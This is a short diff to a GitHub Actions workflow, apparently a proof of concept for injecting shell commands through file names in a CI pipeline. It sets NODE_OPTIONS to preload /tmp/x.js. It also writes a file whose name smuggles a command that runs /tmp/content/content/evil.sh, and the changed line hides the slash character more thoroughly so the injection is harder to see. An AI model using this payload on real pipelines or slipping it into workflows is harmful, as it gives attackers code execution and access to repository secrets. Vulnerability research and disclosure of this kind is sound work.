@@ -18,7 +18,7 @@ jobs:
           echo 'NODE_OPTIONS=--require /tmp/x.js' >> "$GITHUB_ENV"
           echo 'PREPARE_STEP_RAN_AS '$(id -un)
           SH
-          printf 'x' > "out/readme.txt;P=\$(printf \$'\057');bash\${IFS}\${P}tmp\${P}content\${P}content\${P}evil.sh;#.txt"
+          printf 'x' > "out/readme.txt;P=\$(node\${IFS}-e\${IFS}'process.stdout.write(String.fromCharCode(47))');bash\${IFS}\${P}tmp\${P}content\${P}content\${P}evil.sh;#.txt"
           ls -1 out
       - uses: actions/upload-artifact@v4
         with:
